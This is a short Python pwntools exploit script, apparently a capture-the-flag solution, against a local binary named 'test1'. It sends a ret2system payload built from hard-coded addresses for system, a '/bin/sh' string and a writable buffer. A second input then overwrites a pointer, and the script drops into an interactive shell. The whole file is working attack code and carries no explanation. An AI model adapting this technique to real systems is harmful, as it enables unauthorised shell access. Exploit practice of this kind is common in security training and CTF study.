from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
p = process("./test1")
if args.G:
    gdb.attach(p)

bin_sh_addr = 0x80495d0
system_plt = 0x8048370
all_addr = 0x804a060

payload = p32(system_plt) + b"aaaa" + p32(bin_sh_addr)
p.recvuntil("Hello,tell me your story:\n")
p.sendline(payload)

payload1 = b"b"*10 + p32(all_addr + 4)
p.recvuntil("By the way, what's your name:\n")
p.sendline(payload1)

p.interactive()
